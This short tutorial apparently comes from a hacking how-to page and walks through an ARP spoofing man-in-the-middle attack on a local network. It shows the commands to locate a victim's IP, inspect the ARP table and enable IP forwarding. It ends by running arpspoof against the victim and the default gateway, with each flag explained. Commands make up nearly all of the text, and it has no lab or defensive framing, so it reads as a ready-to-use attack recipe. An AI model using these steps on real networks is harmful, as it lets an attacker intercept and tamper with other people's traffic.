First find the IP address of victim.
#ifconfig

Now check the arp table , it will show only routerâ€™s mac address.
#arp

Ping the victim machine and again check arp table , it will get added to it.
#ping Victim-IP
#arp

For arp poisoning / spoofing we have to set up IP forwarding.
#echo 1 > /proc/sys/net/ipv4/ip_forward

Check your default gateway.
#ip route

Find the network interface.
#ifconfig

Now start the arp poisoning / spoofing.
#arpspoof -i eth0 -t victimIP -r DefaultGateway
-i is for interface.
-t is for target.
-r is for default gateway.
